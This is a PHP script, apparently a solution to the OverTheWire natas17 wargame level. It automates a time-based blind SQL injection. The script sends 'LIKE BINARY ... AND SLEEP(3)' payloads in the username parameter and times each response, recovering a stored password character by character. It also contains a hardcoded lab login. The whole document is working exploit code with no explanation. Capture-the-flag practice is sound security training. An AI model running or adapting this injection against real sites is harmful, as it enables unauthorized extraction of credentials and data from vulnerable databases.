<?php
$elems =  array_merge(range('A', 'Z'), range('a', 'z'),range(0,9));
$fullText = "";
for ($j=0; $j < count($elems); $j++) { 
    $found = false;
    for ($i=0; $i < count($elems); $i++) {
        $ct = time();
        $currentChar = $elems[$i];
        $rawTxt = ("natas18\" AND password LIKE BINARY \"".($fullText . $currentChar)."%\" AND SLEEP(3) #");
        $encodedStr = urlencode($rawTxt);
        $host = "http://natas17.natas.labs.overthewire.org/index.php?debug=true&username={$encodedStr}";
        $ch = curl_init($host);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_USERPWD,"natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $return = curl_exec($ch);
        curl_close($ch);
        $resT = time();
        if($resT - $ct > 2){
            $found = true;
            $fullText .= $currentChar;
            echo $fullText;
            echo "\n";
        }
    }
    if(!$found){
        echo "The password for the next level is:\n";
        echo $fullText;
        break;
    }
}
?>